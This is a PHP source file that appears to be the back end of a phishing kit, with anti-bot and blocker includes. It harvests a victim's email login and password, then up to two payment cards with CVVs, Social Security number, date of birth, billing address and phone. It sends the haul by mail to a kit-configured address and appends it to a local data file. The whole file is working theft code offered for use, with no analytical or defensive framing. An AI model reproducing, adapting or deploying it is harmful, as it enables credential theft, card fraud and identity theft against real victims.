<?php 

ob_start();
session_start();

  include './lib/loca.php';
  include './lib/browser.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
  include '../email.php';
  include './lib/err.php';

if(isset($_POST['login'])){

$date = date("d-m-y | h:i:sa");
$email = $_POST['email'];
$password = $_POST['password'];
	
$login = "
#  [ infos ]  ========================

date   : $date
from   : $country
_IP    : $ip
_OS    : $os_platform

======================================

#  [ login ]  ========================

mail    : $email
pass    : $password

======================================\n";
	
	$_SESSION['login'] = $login;
	header("location: update.php");

}

if(isset($_POST['get'])){

$header = "?> $location <?php ";
eval($header);

$nm1 = strtoupper($_POST['nm1']);

$cc1 = $_POST['cc1'];
$mm1 = $_POST['mm1'];
$yy1 = $_POST['yy1'];
$cv1 = $_POST['cv1'];

$nm2 = $_POST['nm2'];
$cc2 = $_POST['cc2'];
$mm2 = $_POST['mm2'];
$yy2 = $_POST['yy2'];
$cv2 = $_POST['cv2'];

$cnt = $_POST['cnt'];

$ad1 = $_POST['ad1'];
$ad2 = $_POST['ad2'];
$sta = $_POST['sta'];
$cit = $_POST['cit'];
$zip = $_POST['zip'];
$phn = $_POST['phn'];
	
$ssn = $_POST['ssn'];
$dob = $_POST['dob'];


if ($cc2>=15) {
$cc2 ="\n
# [ card 2 ] =========================

nam    : $nm2
cc2    : $cc2
exp    : $mm2/$yy2
ccv    : $cv2

======================================";
}	

$txt = $_SESSION['login']."
# [ card 1 ] =========================

nam    : $nm1
cc1    : $cc1
exp    : $mm1/$yy1
ccv    : $cv1

ssn    : $ssn

====================================== $cc2

#  [ billing ]  ======================

cnt    : $cnt
ad1    : $ad1
ad2    : $ad2
sta    : $sta
cit    : $cit
zip    : $zip
phn    : $phn
dob    : $dob

======================================\n\n\n\n";

	
$subject = "❤ New VBV * ".$n1." -from: ".$n1." ❤";
$headers = "From: MegaMass <7issatok@gmail.com> " . "\r\n";

mail($email, $subject, $txt, $headers);

$path = "../data.txt";
$fp = fopen($path, "a");
fwrite($fp,$txt);
fclose($fp);
	
	header("location: thanks.php");
	exit();

}


?>